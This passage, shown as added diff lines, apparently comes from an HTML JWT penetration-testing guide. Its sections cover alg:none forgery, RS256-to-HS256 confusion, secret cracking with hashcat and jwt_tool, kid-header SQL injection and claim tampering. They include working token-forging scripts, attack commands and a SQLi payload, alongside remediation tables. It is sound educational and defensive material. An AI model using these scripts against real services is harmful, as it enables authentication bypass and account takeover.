+<span class="t-comment"># Install supporting tools</span>
+<span class="t-prompt">$</span> pip install pyjwt cryptography requests
+<span class="t-prompt">$</span> npm install -g jwt-cli
+
+<span class="t-comment"># Quick decode without jwt_tool</span>
+<span class="t-prompt">$</span> <span class="t-key">TOKEN</span>=<span class="t-string">"eyJhbGci..."</span>
+<span class="t-prompt">$</span> echo <span class="t-string">"$TOKEN"</span> | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
+      </div>
+    </div>
+  </section>
+
+  <div class="divider"><span class="divider-icon">// ATTACK_CLASS_01</span></div>
+
+  <!-- ATTACK 1: ALG NONE -->
+  <section class="section reveal" id="alg-none">
+    <div class="section-badge">
+      <span class="badge-id">JWT-01</span>
+      <span class="badge-sev crit">Critical</span>
+    </div>
+    <div class="section-title">ALGORITHM NONE ATTACK</div>
+    <p class="section-sub">Removing the signature entirely by setting alg to "none" — the oldest and most devastating JWT vulnerability.</p>
+
+    <p>The JWT specification allows the algorithm value <code>"none"</code> to indicate an "unsecured JWT" with no signature. Vulnerable libraries that honour this value allow an attacker to forge any token with any payload — simply by setting <code>alg: none</code> and dropping the signature.</p>
+
+    <div class="flow-diagram">
+      <div class="flow-title">// ATTACK_FLOW: alg:none</div>
+      <div class="flow-steps">
+        <div class="flow-step">
+          <div class="flow-box">Intercept valid JWT</div>
+          <div class="flow-label">baseline token</div>
+        </div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">
+          <div class="flow-box attack">Set alg: "none"</div>
+          <div class="flow-label">modify header</div>
+        </div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">
+          <div class="flow-box attack">Modify payload<br>(role: "admin")</div>
+          <div class="flow-label">forge claims</div>
+        </div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">
+          <div class="flow-box attack">Remove signature</div>
+          <div class="flow-label">header.payload.</div>
+        </div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">
+          <div class="flow-box success">Server accepts<br>forged token</div>
+          <div class="flow-label">🔓 pwned</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-bar">
+        <span class="code-lang">Python</span>
+        <span class="code-filename">alg_none_attack.py</span>
+      </div>
+      <div class="code-body">
+<span class="t-keyword">import</span> base64, json, requests
+
+<span class="t-keyword">def</span> <span class="t-func">b64url_encode</span>(data):
+    <span class="t-keyword">return</span> base64.urlsafe_b64encode(data).rstrip(<span class="t-string">b'='</span>).decode()
+
+<span class="t-comment"># Original token (captured from Burp)</span>
+<span class="t-var">original_token</span> = <span class="t-string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."</span>
+
+<span class="t-comment"># Step 1: Forge header with alg: none (try all variants)</span>
+<span class="t-var">alg_variants</span> = [<span class="t-string">"none"</span>, <span class="t-string">"None"</span>, <span class="t-string">"NONE"</span>, <span class="t-string">"nOnE"</span>]
+
+<span class="t-keyword">for</span> alg <span class="t-keyword">in</span> alg_variants:
+    <span class="t-var">header</span>  = {<span class="t-string">"alg"</span>: alg, <span class="t-string">"typ"</span>: <span class="t-string">"JWT"</span>}
+    <span class="t-var">payload</span> = {<span class="t-string">"sub"</span>: <span class="t-string">"admin"</span>, <span class="t-string">"role"</span>: <span class="t-string">"admin"</span>, <span class="t-string">"exp"</span>: <span class="t-num">9999999999</span>}
+
+    <span class="t-var">h64</span> = <span class="t-func">b64url_encode</span>(json.dumps(header).encode())
+    <span class="t-var">p64</span> = <span class="t-func">b64url_encode</span>(json.dumps(payload).encode())
+
+    <span class="t-comment"># No signature — just header.payload. (trailing dot required by some libs)</span>
+    <span class="t-var">forged</span> = <span class="t-string">f"{h64}.{p64}."</span>
+
+    <span class="t-var">resp</span> = requests.<span class="t-func">get</span>(
+        <span class="t-string">"https://target.com/api/admin"</span>,
+        headers={<span class="t-string">"Authorization"</span>: <span class="t-string">f"Bearer {forged}"</span>}
+    )
+    <span class="t-func">print</span>(<span class="t-string">f"alg={alg}: {resp.status_code} {resp.text[:80]}"</span>)
+      </div>
+    </div>
+
+    <div class="callout callout-crit">
+      <span class="callout-icon">🔴</span>
+      <div class="callout-text">A 200 response with the forged admin token confirms a Critical finding. This vulnerability allows complete authentication bypass and full privilege escalation — no key material required. Escalate immediately.</div>
+    </div>
+
+    <div class="checklist">
+      <div class="checklist-title">Evidence Collection</div>
+      <div class="check-item"><span class="check-box">☐</span><span class="check-text">Screenshot of Burp request/response showing 200 with forged token</span></div>
+      <div class="check-item"><span class="check-box">☐</span><span class="check-text">Decoded forged token showing modified role/claims</span></div>
+      <div class="check-item"><span class="check-box">☐</span><span class="check-text">Comparison of original vs forged response proving privilege escalation</span></div>
+      <div class="check-item"><span class="check-box">☐</span><span class="check-text">Record all alg variants that succeeded (none, None, NONE, nOnE)</span></div>
+    </div>
+  </section>
+
+  <div class="divider"><span class="divider-icon">// ATTACK_CLASS_02</span></div>
+
+  <!-- ATTACK 2: ALG CONFUSION -->
+  <section class="section reveal" id="alg-confusion">
+    <div class="section-badge">
+      <span class="badge-id">JWT-02</span>
+      <span class="badge-sev crit">Critical</span>
+    </div>
+    <div class="section-title">ALGORITHM CONFUSION (RS256→HS256)</div>
+    <p class="section-sub">Tricking an asymmetric-key server into verifying a token with its own public key used as an HMAC secret.</p>
+
+    <p>When a server uses <strong>RS256</strong> (asymmetric), it signs with a private key and verifies with the public key. If the library accepts any algorithm the client specifies, an attacker can switch to <strong>HS256</strong> (symmetric) and sign the token using the server's <em>public key</em> as the HMAC secret — which the attacker can obtain from the <code>/jwks.json</code> endpoint.</p>
+
+    <div class="code-block">
+      <div class="code-bar">
+        <span class="code-lang">Python</span>
+        <span class="code-filename">alg_confusion.py</span>
+      </div>
+      <div class="code-body">
+<span class="t-keyword">import</span> jwt, requests
+<span class="t-keyword">from</span> cryptography.hazmat.primitives <span class="t-keyword">import</span> serialization
+
+<span class="t-comment"># Step 1: Retrieve the public key from JWKS endpoint</span>
+<span class="t-var">jwks</span> = requests.<span class="t-func">get</span>(<span class="t-string">"https://target.com/.well-known/jwks.json"</span>).json()
+
+<span class="t-comment"># Step 2: Extract and convert public key to PEM bytes</span>
+<span class="t-keyword">from</span> jwt.algorithms <span class="t-keyword">import</span> RSAAlgorithm
+<span class="t-var">public_key</span> = RSAAlgorithm.<span class="t-func">from_jwk</span>(jwks[<span class="t-string">'keys'</span>][<span class="t-num">0</span>])
+<span class="t-var">public_key_pem</span> = public_key.<span class="t-func">public_bytes</span>(
+    encoding=serialization.Encoding.PEM,
+    format=serialization.PublicFormat.SubjectPublicKeyInfo
+)
+
+<span class="t-comment"># Step 3: Sign a forged payload using the PUBLIC key as HMAC secret</span>
+<span class="t-var">forged_payload</span> = {
+    <span class="t-string">"sub"</span>:  <span class="t-string">"admin"</span>,
+    <span class="t-string">"role"</span>: <span class="t-string">"administrator"</span>,
+    <span class="t-string">"exp"</span>:  <span class="t-num">9999999999</span>
+}
+
+<span class="t-var">forged_token</span> = jwt.<span class="t-func">encode</span>(
+    forged_payload,
+    public_key_pem,     <span class="t-comment">← using PUBLIC key as HMAC secret</span>
+    algorithm=<span class="t-string">"HS256"</span>   <span class="t-comment">← server was expecting RS256</span>
+)
+
+<span class="t-comment"># Step 4: Send forged token — server verifies HS256 with its own public key</span>
+<span class="t-var">r</span> = requests.<span class="t-func">get</span>(
+    <span class="t-string">"https://target.com/api/admin/users"</span>,
+    headers={<span class="t-string">"Authorization"</span>: <span class="t-string">f"Bearer {forged_token}"</span>}
+)
+<span class="t-func">print</span>(r.status_code, r.text[:<span class="t-num">200</span>])
+      </div>
+    </div>
+
+    <div class="callout callout-crit">
+      <span class="callout-icon">🔴</span>
+      <div class="callout-text"><strong>Remediation:</strong> The server must explicitly whitelist the expected algorithm — never trust the <code>alg</code> field from the client token. Use <code>algorithms=["RS256"]</code> (not <code>algorithms=["RS256","HS256"]</code>) in your JWT library's verify call.</div>
+    </div>
+  </section>
+
+  <div class="divider"><span class="divider-icon">// ATTACK_CLASS_03</span></div>
+
+  <!-- ATTACK 3: WEAK SECRET -->
+  <section class="section reveal" id="weak-secret">
+    <div class="section-badge">
+      <span class="badge-id">JWT-03</span>
+      <span class="badge-sev crit">Critical</span>
+    </div>
+    <div class="section-title">WEAK SECRET BRUTE-FORCE</div>
+    <p class="section-sub">Cracking the HMAC signing secret offline using hashcat or jwt_tool — no server interaction required after the token is captured.</p>
+
+    <p>HMAC-signed JWTs (HS256/HS384/HS512) are only as strong as their secret key. Short, default, or dictionary-based secrets can be cracked offline at billions of guesses per second using a GPU. An attacker needs only a single valid JWT to begin cracking — no server lockout mechanism applies.</p>
+
+    <div class="code-block">
+      <div class="code-bar">
+        <span class="code-lang">Bash</span>
+        <span class="code-filename">crack_secret.sh</span>
+      </div>
+      <div class="code-body">
+<span class="t-comment"># Method 1: hashcat — fastest, GPU-accelerated</span>
+<span class="t-prompt">$</span> hashcat -a 0 -m 16500 captured_token.txt /usr/share/wordlists/rockyou.txt
+
+<span class="t-comment"># Method 2: hashcat with rules for variations</span>
+<span class="t-prompt">$</span> hashcat -a 0 -m 16500 captured_token.txt wordlist.txt -r rules/best64.rule
+
+<span class="t-comment"># Method 3: jwt_tool built-in cracker</span>
+<span class="t-prompt">$</span> python3 jwt_tool.py &lt;TOKEN&gt; -C -d /usr/share/wordlists/rockyou.txt
+
+<span class="t-comment"># Method 4: brute-force short secrets (1-6 chars)</span>
+<span class="t-prompt">$</span> python3 jwt_tool.py &lt;TOKEN&gt; -C -p <span class="t-string">"secret"</span>   <span class="t-comment"># test specific value</span>
+<span class="t-prompt">$</span> python3 jwt_tool.py &lt;TOKEN&gt; -C -p <span class="t-string">"password"</span>
+<span class="t-prompt">$</span> python3 jwt_tool.py &lt;TOKEN&gt; -C -p <span class="t-string">"jwt_secret"</span>
+
+<span class="t-comment"># Common weak secrets to always test manually:</span>
+<span class="t-comment"># secret, password, 123456, qwerty, jwt, changeme,</span>
+<span class="t-comment"># your-256-bit-secret, supersecret, [app_name], [domain]</span>
+
+<span class="t-output">>>> [+] secret found: "mysecret123"</span>
+<span class="t-output">>>> Use this to forge tokens: jwt.encode(payload, "mysecret123", algorithm="HS256")</span>
+      </div>
+    </div>
+
+    <div class="callout callout-warn">
+      <span class="callout-icon">⚠️</span>
+      <div class="callout-text">Once the secret is cracked, you can forge tokens for ANY user — including admin accounts — by simply encoding a new payload with the known secret. Document the cracked secret and the time taken as evidence of inadequate key strength.</div>
+    </div>
+  </section>
+
+  <div class="divider"><span class="divider-icon">// ATTACK_CLASS_04</span></div>
+
+  <!-- ATTACK 4: KID INJECTION -->
+  <section class="section reveal" id="kid-injection">
+    <div class="section-badge">
+      <span class="badge-id">JWT-04</span>
+      <span class="badge-sev crit">Critical</span>
+    </div>
+    <div class="section-title">KEY ID (kid) INJECTION</div>
+    <p class="section-sub">Manipulating the kid header to perform SQL injection, path traversal, or SSRF in the key lookup mechanism.</p>
+
+    <p>The <code>kid</code> (Key ID) header parameter tells the server which key to use for verification. If the server uses the <code>kid</code> value in a database query or file path lookup without sanitization, this becomes a classical injection point — with the added bonus that a successful SQLi lets you control the signing key itself.</p>
+
+    <div class="test-cards">
+      <div class="test-card">
+        <div class="test-num">01</div>
+        <div class="test-info">
+          <div class="test-name">SQL Injection via kid header</div>
+          <div class="test-desc">Set kid to a SQLi payload that forces the key lookup to return a known value, then sign the token with that value.</div>
+        </div>
+        <div class="test-tool">Manual + Burp</div>
+      </div>
+      <div class="test-card">
+        <div class="test-num">02</div>
+        <div class="test-info">
+          <div class="test-name">Path Traversal via kid header</div>
+          <div class="test-desc">Set kid to ../../dev/null or a predictable file to control the signing key content.</div>
+        </div>
+        <div class="test-tool">jwt_tool -T</div>
+      </div>
+      <div class="test-card">
+        <div class="test-num">03</div>
+        <div class="test-info">
+          <div class="test-name">SSRF via jku / x5u headers</div>
+          <div class="test-desc">Point jku to an attacker-controlled JWKS endpoint hosting a self-generated key pair.</div>
+        </div>
+        <div class="test-tool">Burp Collaborator</div>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-bar">
+        <span class="code-lang">Python</span>
+        <span class="code-filename">kid_sqli.py</span>
+      </div>
+      <div class="code-body">
+<span class="t-keyword">import</span> jwt, json, base64, hmac, hashlib
+
+<span class="t-comment"># SQLi payload: force the DB to return our known string as the key</span>
+<span class="t-comment"># Assumes server runs: SELECT key FROM keys WHERE kid = ?</span>
+<span class="t-var">sqli_kid</span> = <span class="t-string">"x' UNION SELECT 'hacked_secret' -- "</span>
+<span class="t-var">our_key</span>  = <span class="t-string">"hacked_secret"</span>  <span class="t-comment">← what the SQL returns</span>
+
+<span class="t-comment"># Build forged token with malicious kid and sign with our known key</span>
+<span class="t-var">header</span>  = {<span class="t-string">"alg"</span>: <span class="t-string">"HS256"</span>, <span class="t-string">"typ"</span>: <span class="t-string">"JWT"</span>, <span class="t-string">"kid"</span>: sqli_kid}
+<span class="t-var">payload</span> = {<span class="t-string">"sub"</span>: <span class="t-string">"admin"</span>, <span class="t-string">"role"</span>: <span class="t-string">"admin"</span>}
+
+<span class="t-keyword">def</span> <span class="t-func">b64url</span>(d): <span class="t-keyword">return</span> base64.urlsafe_b64encode(d).rstrip(<span class="t-string">b'='</span>).decode()
+
+<span class="t-var">h</span> = <span class="t-func">b64url</span>(json.dumps(header, separators=(<span class="t-string">','</span>,<span class="t-string">':'</span>)).encode())
+<span class="t-var">p</span> = <span class="t-func">b64url</span>(json.dumps(payload, separators=(<span class="t-string">','</span>,<span class="t-string">':'</span>)).encode())
+<span class="t-var">sig_input</span> = <span class="t-string">f"{h}.{p}"</span>.encode()
+<span class="t-var">sig</span> = <span class="t-func">b64url</span>(hmac.<span class="t-func">new</span>(our_key.encode(), sig_input, hashlib.sha256).digest())
+
+<span class="t-var">forged</span> = <span class="t-string">f"{h}.{p}.{sig}"</span>
+<span class="t-func">print</span>(<span class="t-string">f"Forged token:\n{forged}"</span>)
+
+<span class="t-comment"># Also test path traversal: kid = "../../dev/null"</span>
+<span class="t-comment"># Sign with empty string — /dev/null is empty</span>
+<span class="t-var">pt_header</span> = {<span class="t-string">"alg"</span>: <span class="t-string">"HS256"</span>, <span class="t-string">"kid"</span>: <span class="t-string">"../../dev/null"</span>}
+      </div>
+    </div>
+  </section>
+
+  <div class="divider"><span class="divider-icon">// ATTACK_CLASS_05</span></div>
+
+  <!-- ATTACK 5: EXPIRY BYPASS -->
+  <section class="section reveal" id="expiry">
+    <div class="section-badge">
+      <span class="badge-id">JWT-05</span>
+      <span class="badge-sev high">High</span>
+    </div>
+    <div class="section-title">EXPIRY &amp; CLAIM MANIPULATION</div>
+    <p class="section-sub">Modifying exp, iat, nbf, and privilege-bearing claims when signature validation is absent or misconfigured.</p>
+
+    <div class="test-cards">
+      <div class="test-card">
+        <div class="test-num">01</div>
+        <div class="test-info">
+          <div class="test-name">Expired Token Acceptance</div>
+          <div class="test-desc">Send a token with exp in the past. Server should return 401. If 200 — expiry is not validated.</div>
+        </div>
+        <div class="test-tool">Burp Repeater</div>
+      </div>
+      <div class="test-card">
+        <div class="test-num">02</div>
+        <div class="test-info">
+          <div class="test-name">Role/Permission Claim Tampering</div>
+          <div class="test-desc">Modify role, isAdmin, permissions, group claims in the payload. Resign with known secret or test for signature skip.</div>
+        </div>
+        <div class="test-tool">jwt_tool -T</div>
+      </div>
+      <div class="test-card">
+        <div class="test-num">03</div>
+        <div class="test-info">
+          <div class="test-name">nbf / iat Future Dating</div>
+          <div class="test-desc">Set nbf (not before) far in the future. Compliant servers should reject the token as not yet valid.</div>
+        </div>
+        <div class="test-tool">Manual crafting</div>
+      </div>
+      <div class="test-card">
+        <div class="test-num">04</div>
+        <div class="test-info">
+          <div class="test-name">Subject (sub) Claim Substitution</div>
+          <div class="test-desc">Replace sub with another user's ID or username to test for IDOR via JWT manipulation.</div>
+        </div>
+        <div class="test-tool">Burp + jwt_tool</div>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-bar">
+        <span class="code-lang">Bash</span>
+        <span class="code-filename">jwt_tool_tamper.sh</span>
+      </div>
+      <div class="code-body">
+<span class="t-comment"># jwt_tool: tamper mode — interactively modify any claim</span>
+<span class="t-prompt">$</span> python3 jwt_tool.py &lt;TOKEN&gt; -T
+
+<span class="t-comment"># Automated: set specific claim values</span>
+<span class="t-prompt">$</span> python3 jwt_tool.py &lt;TOKEN&gt; -T -pc role -pv administrator
+
+<span class="t-comment"># Test all OWASP checks automatically</span>
+<span class="t-prompt">$</span> python3 jwt_tool.py &lt;TOKEN&gt; -t https://target.com/api/protected -rh "Authorization: Bearer JWT" -M at
+
+<span class="t-comment"># Verify specific endpoint with modified token</span>
+<span class="t-prompt">$</span> python3 jwt_tool.py &lt;TOKEN&gt; -t https://target.com/api/admin \
+    -rh <span class="t-string">"Authorization: Bearer JWT"</span> \
+    -pc role -pv admin
+      </div>
+    </div>
+  </section>
+
+  <div class="divider"><span class="divider-icon">// ATTACK_CLASS_06_09</span></div>
+
+  <!-- REMAINING ATTACKS OVERVIEW -->
+  <section class="section reveal" id="more-attacks">
+    <div class="section-badge"><span class="badge-id">JWT-06 → JWT-09</span></div>
+    <div class="section-title">FURTHER ATTACK CLASSES</div>
+    <p class="section-sub">Additional vulnerability classes requiring testing in every JWT engagement.</p>
+
+    <table class="vuln-table">
+      <thead>
+        <tr>
+          <th>ID</th>
+          <th>Vulnerability</th>
+          <th>Severity</th>
+          <th>Description &amp; Test Approach</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>JWT-06</td>
+          <td>JWK Header Injection</td>
+          <td><span class="badge-sev crit" style="font-size:0.58rem;padding:0.15rem 0.5rem">Critical</span></td>
+          <td>Embed a self-generated public key directly in the <code>jwk</code> header parameter. Vulnerable servers use the attacker-supplied key to verify. Test: include <code>"jwk": {...attacker_pub_key...}</code> in header.</td>
+        </tr>
+        <tr>
+          <td>JWT-07</td>
+          <td>jku SSRF / Header Injection</td>
+          <td><span class="badge-sev crit" style="font-size:0.58rem;padding:0.15rem 0.5rem">Critical</span></td>
+          <td>Set <code>jku</code> to an attacker-controlled URL hosting a crafted JWKS. Server fetches and uses attacker's public key. Detect with Burp Collaborator. Test URL bypass: use redirects, CNAME tricks, @ characters.</td>
+        </tr>
+        <tr>
+          <td>JWT-08</td>
+          <td>Token Not Revoked on Logout</td>
+          <td><span class="badge-sev high" style="font-size:0.58rem;padding:0.15rem 0.5rem">High</span></td>
+          <td>Log out, then replay the captured pre-logout token. If accepted, the application lacks server-side revocation. Test all token types: access token, refresh token, session token.</td>
+        </tr>
+        <tr>
+          <td>JWT-09</td>
+          <td>Sensitive Data in Payload</td>
+          <td><span class="badge-sev med" style="font-size:0.58rem;padding:0.15rem 0.5rem">Medium</span></td>
+          <td>Decode the JWT payload and inspect all claims. PII, internal IDs, email addresses, roles, or system info in unencrypted payloads are an information disclosure finding. Note: JWS ≠ JWE (encrypted JWT).</td>
+        </tr>
+      </tbody>
+    </table>
+  </section>
+
+  <div class="divider"><span class="divider-icon">// SECURE_VS_VULNERABLE</span></div>
+
+  <!-- COMPARISON -->
+  <section class="section reveal" id="comparison">
+    <div class="section-badge"><span class="badge-id">ANALYSIS</span></div>
+    <div class="section-title">SECURE vs VULNERABLE CONFIGURATIONS</div>
+
+    <div class="vs-wrap">
+      <div class="vs-panel vs-vuln">
+        <div class="vs-header">❌ Vulnerable Implementation</div>
+        <div class="vs-code">
+          // NEVER DO THIS<br><br>
+          jwt.verify(token, secret, {<br>
+          &nbsp;&nbsp;// No algorithm whitelist<br>
+          &nbsp;&nbsp;// Accepts "none", HS256, RS256...<br>
+          })<br><br>
+          // OR: skipping verification entirely<br>
+          const payload = jwt.decode(token)<br>
+          // no .verify() called
+        </div>
+      </div>
+      <div class="vs-panel vs-safe">
+        <div class="vs-header">✅ Secure Implementation</div>
+        <div class="vs-code">
+          // ALWAYS whitelist algorithm<br><br>
+          jwt.verify(token, secret, {<br>
+          &nbsp;&nbsp;algorithms: ["HS256"], // explicit<br>
+          &nbsp;&nbsp;issuer: "api.yourapp.com",<br>
+          &nbsp;&nbsp;audience: "web-client",<br>
+          &nbsp;&nbsp;clockTolerance: 30<br>
+          })<br>
+          // Rejects alg:none, RS256, etc.
+        </div>
+      </div>
+    </div>
+
+    <div class="vs-wrap" style="margin-top:1px">
+      <div class="vs-panel vs-vuln">
+        <div class="vs-header">❌ Weak Secret (Crackable)</div>
+        <div class="vs-code">
+          SECRET_KEY = "secret"<br>
+          SECRET_KEY = "password123"<br>
+          SECRET_KEY = "mysupersecret"<br>
+          SECRET_KEY = app.name  // predictable<br><br>
+          // HS256 with &lt; 256-bit key is weak
+        </div>
+      </div>
+      <div class="vs-panel vs-safe">
+        <div class="vs-header">✅ Strong Secret</div>
+        <div class="vs-code">
+          // Generate cryptographically random secret<br>
+          $ openssl rand -hex 64<br><br>
+          SECRET_KEY = os.environ["JWT_SECRET"]<br>
+          // Min 256 bits (32 bytes) for HS256<br>
+          // Or use RS256/ES256 with proper<br>
+          // key management
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <div class="divider"><span class="divider-icon">// REMEDIATION</span></div>
+
+  <!-- REMEDIATION -->
+  <section class="section reveal" id="remediation">
+    <div class="section-badge"><span class="badge-id">REMEDIATION</span></div>
+    <div class="section-title">REMEDIATION CONTROLS</div>
+
+    <table class="vuln-table">
+      <thead>
+        <tr><th>Control</th><th>Implementation</th><th>Addresses</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Whitelist algorithm</td>
+          <td>Explicitly specify <code>algorithms=["RS256"]</code> in verify call. Never trust the <code>alg</code> field from the token itself.</td>
+          <td>JWT-01, JWT-02</td>
+        </tr>
+        <tr>
+          <td>Use RS256 or ES256</td>
+          <td>Prefer asymmetric algorithms for JWTs exposed to clients. Keeps the signing key private and uncrackable from token data alone.</td>
+          <td>JWT-03</td>
+        </tr>
+        <tr>
+          <td>Strong HMAC secrets</td>
+          <td>Generate secrets with <code>openssl rand -hex 64</code>. Minimum 256 bits for HS256. Store in secrets manager, never in code.</td>
+          <td>JWT-03</td>
+        </tr>
+        <tr>
+          <td>Sanitize kid / jku / x5u</td>
+          <td>Validate <code>kid</code> against a whitelist of known key IDs. Never use <code>kid</code> directly in SQL queries or file paths. Block external URLs in <code>jku</code>.</td>
+          <td>JWT-04, JWT-07</td>
+        </tr>
+        <tr>
+          <td>Validate all claims</td>
+          <td>Always verify <code>exp</code>, <code>nbf</code>, <code>iss</code>, <code>aud</code>. Reject tokens missing mandatory claims. Never skip expiry validation.</td>
+          <td>JWT-05</td>
+        </tr>
+        <tr>
+          <td>Implement token revocation</td>
+          <td>Maintain a server-side blocklist (Redis) of revoked JTIs. Check on every request. Short token lifetimes reduce the revocation window.</td>
+          <td>JWT-08</td>
+        </tr>
+        <tr>
+          <td>Never store sensitive data in payload</td>
+          <td>JWT payloads are visible to anyone. Use opaque reference tokens or JWE (encrypted JWT) if sensitive claims are required.</td>
+          <td>JWT-09</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="callout callout-tip">
+      <span class="callout-icon">✅</span>
+      <div class="callout-text"><strong>Quick wins:</strong> The highest-impact single change is adding an explicit algorithm whitelist to your JWT verification call. This alone eliminates algorithm confusion and alg:none attacks — the two most commonly found Critical-severity JWT vulnerabilities in production applications.</div>
+    </div>
+  </section>
+
+  <div class="divider"><span class="divider-icon">// TOOLING</span></div>
+
+  <!-- TOOLS -->
+  <section class="section reveal" id="tools">
+    <div class="section-badge"><span class="badge-id">TOOLING</span></div>
+    <div class="section-title">TESTING TOOLKIT</div>
+
+    <table class="vuln-table">
+      <thead>
+        <tr><th>Tool</th><th>Use Case</th><th>Install</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>jwt_tool</td>
+          <td>All-in-one JWT pentesting: tamper, crack, fuzz, test all OWASP checks</td>
+          <td><code>git clone ticarpi/jwt_tool</code></td>
+        </tr>
+        <tr>
+          <td>Burp JWT Editor</td>
+          <td>GUI-based JWT manipulation, key generation, and attack automation inside Burp</td>
+          <td>Burp Suite BApp Store</td>
+        </tr>
+        <tr>
+          <td>hashcat (mode 16500)</td>
+          <td>GPU-accelerated HS256/HS384/HS512 secret brute-forcing</td>
+          <td><code>apt install hashcat</code></td>
+        </tr>
+        <tr>
+          <td>PyJWT + cryptography</td>
+          <td>Scripting custom JWT attacks and exploit PoCs in Python</td>
+          <td><code>pip install pyjwt cryptography</code></td>
+        </tr>
+        <tr>
+          <td>jwt.io</td>
+          <td>Browser-based JWT decoder for quick inspection during recon</td>
+          <td>jwt.io</td>
+        </tr>
+      </tbody>
+    </table>
+  </section>
+
+</article>
+
+<!-- TOC SIDEBAR -->
+<aside>
+  <nav class="toc-box">
+    <div class="toc-head">Contents</div>
+    <div class="toc-nav">
+      <a href="#intro"><span class="toc-index">00</span>Introduction</a>
+      <a href="#anatomy"><span class="toc-index">01</span>JWT Anatomy</a>
+      <a href="#setup"><span class="toc-index">02</span>Setup</a>
+      <a href="#alg-none"><span class="toc-index">03</span>Alg: None Attack</a>
+      <a href="#alg-confusion"><span class="toc-index">04</span>Alg Confusion</a>
+      <a href="#weak-secret"><span class="toc-index">05</span>Weak Secret</a>
+      <a href="#kid-injection"><span class="toc-index">06</span>kid Injection</a>
+      <a href="#expiry"><span class="toc-index">07</span>Expiry / Claims</a>
+      <a href="#more-attacks"><span class="toc-index">08</span>More Attacks</a>
+      <a href="#comparison"><span class="toc-index">09</span>Secure vs Vuln</a>
+      <a href="#remediation"><span class="toc-index">10</span>Remediation</a>
+      <a href="#tools"><span class="toc-index">11</span>Toolkit</a>
+    </div>
+  </nav>
+</aside>
+
+</div><!-- /content-grid -->
+</div><!-- /wrapper -->
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-id">JWT_PENTEST_GUIDE // v1.0 // RFC7519</div>
+  <ul class="footer-links">
+    <li><a href="https://tools.ietf.org/html/rfc7519" target="_blank">RFC 7519</a></li>
+    <li><a href="https://portswigger.net/web-security/jwt" target="_blank">PortSwigger JWT Labs</a></li>
+    <li><a href="https://github.com/ticarpi/jwt_tool" target="_blank">jwt_tool</a></li>
+    <li><a href="https://owasp.org" target="_blank">OWASP</a></li>
+  </ul>
+</footer>
+
+<script>
+// ── CUSTOM CURSOR ──
+const cursor = document.getElementById('cursor');
+const ring   = document.getElementById('cursor-ring');
+let mx = 0, my = 0, rx = 0, ry = 0;
+
+document.addEventListener('mousemove', e => {
+  mx = e.clientX; my = e.clientY;
+  cursor.style.left = mx - 4 + 'px';
+  cursor.style.top  = my - 4 + 'px';
+});
+
+function animRing() {
+  rx += (mx - rx - 16) * 0.12;
+  ry += (my - ry - 16) * 0.12;
+  ring.style.left = rx + 'px';
+  ring.style.top  = ry + 'px';
+  requestAnimationFrame(animRing);
+}
+animRing();
+
+document.querySelectorAll('a,button,.test-card,.stat,.check-item').forEach(el => {
+  el.addEventListener('mouseenter', () => {
+    cursor.style.transform = 'scale(2.5)';
+    ring.style.transform   = 'scale(1.5)';
+    ring.style.borderColor = 'rgba(0,255,136,0.7)';
+  });
+  el.addEventListener('mouseleave', () => {
+    cursor.style.transform = 'scale(1)';
+    ring.style.transform   = 'scale(1)';
+    ring.style.borderColor = 'rgba(0,255,136,0.4)';
+  });
+});
+
+// ── MATRIX RAIN ──
+const canvas = document.getElementById('matrix-canvas');
+const ctx    = canvas.getContext('2d');
+
+function resizeCanvas() {
+  canvas.width  = window.innerWidth;
+  canvas.height = window.innerHeight;
+}
+resizeCanvas();
+window.addEventListener('resize', resizeCanvas);
+
+const cols = Math.floor(window.innerWidth / 18);
+const drops = Array(cols).fill(1);
+const chars  = '01アイウエオカキクケコJWTHEADERSIGNATURE{}[]<>';
+
+function drawMatrix() {
+  ctx.fillStyle = 'rgba(3,5,7,0.05)';
+  ctx.fillRect(0, 0, canvas.width, canvas.height);
+  ctx.fillStyle = '#00ff88';
+  ctx.font = '13px JetBrains Mono, monospace';
+
+  drops.forEach((y, i) => {
+    const ch = chars[Math.floor(Math.random() * chars.length)];
+    ctx.fillText(ch, i * 18, y * 18);
+    if (y * 18 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+    drops[i]++;
+  });
+}
+setInterval(drawMatrix, 60);
+
+// ── PROGRESS BAR ──
+window.addEventListener('scroll', () => {
+  const pct = window.scrollY / (document.documentElement.scrollHeight - window.innerHeight) * 100;
+  document.getElementById('progress').style.width = pct + '%';
+});
+
+// ── SCROLL REVEAL ──
+const revealObs = new IntersectionObserver(entries => {
+  entries.forEach((e, i) => {
+    if (e.isIntersecting) {
+      setTimeout(() => e.target.classList.add('vis'), i * 60);
+    }
+  });
+}, { threshold: 0.08 });
+
+document.querySelectorAll('.reveal').forEach(el => revealObs.observe(el));
+
+// ── TOC ACTIVE HIGHLIGHT ──
+const sections  = document.querySelectorAll('.section[id]');
+const tocLinks  = document.querySelectorAll('.toc-nav a');
+
+const tocObs = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      tocLinks.forEach(l => l.classList.remove('active'));
+      const a = document.querySelector(`.toc-nav a[href="#${e.target.id}"]`);
+      if (a) a.classList.add('active');
+    }
+  });
+}, { threshold: 0.4 });
+
+sections.forEach(s => tocObs.observe(s));
+</script>
+</body>
+</html>
